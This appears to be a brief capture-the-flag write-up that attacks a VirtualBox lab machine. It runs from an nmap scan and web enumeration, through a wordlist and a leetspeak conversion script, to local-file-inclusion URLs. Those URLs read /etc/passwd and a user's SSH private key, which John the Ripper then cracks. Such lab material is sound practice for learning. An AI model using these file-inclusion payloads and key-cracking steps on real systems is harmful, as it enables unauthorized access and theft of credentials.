## Nmap Scan
```
Nmap scan report for 192.168.20.6
Host is up (0.00024s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 21:a5:80:4d:e9:b6:f0:db:71:4d:30:a0:69:3a:c5:0e (ECDSA)
|_  256 40:90:68:70:66:eb:f2:6c:f4:ca:f5:be:36:82:d0:72 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:6A:2F:23 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```bash
dirsearch -u http://192.168.20.6/
```
`http://192.168.20.6/robots.txt`

```bash
cewl http://192.168.20.6/robots.txt
```

leet 1337 converter

```bash
#!/bin/bash

# Verify that a file was provided as an argument.
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 dic.txt"
    exit 1
fi

# Input/output files
file_input="$1"
file_output="1337_format.txt"

# Transformations in basic 1337 format using sed tool
sed -e 's/a/4/g' \
    -e 's/e/3/g' \
    -e 's/i/1/g' \
    -e 's/l/1/g' \
    -e 's/o/0/g' \
    -e 's/s/5/g' \
    -e 's/t/7/g' \
    "$file_input" > temp_1337.txt

# Merge original and transformed words, removing duplicates and unnecessary capital letters
cat "$file_input" temp_1337.txt | tr '[:upper:]' '[:lower:]' | sort | uniq > "$file_output"

# Clean temp file
rm temp_1337.txt

# Show success message
echo "saved to : $file_output"
```


`http://192.168.20.6/n3gr4/m414nj3.php?page=/etc/passwd`

`http://192.168.20.6/n3gr4/m414nj3.php?page=/home/p4l4nc4/.ssh/id_rsa`

```bash
ssh2john id_rsa > hash

john hash --wordlist=/usr/wordlists/rockyou.txt
```

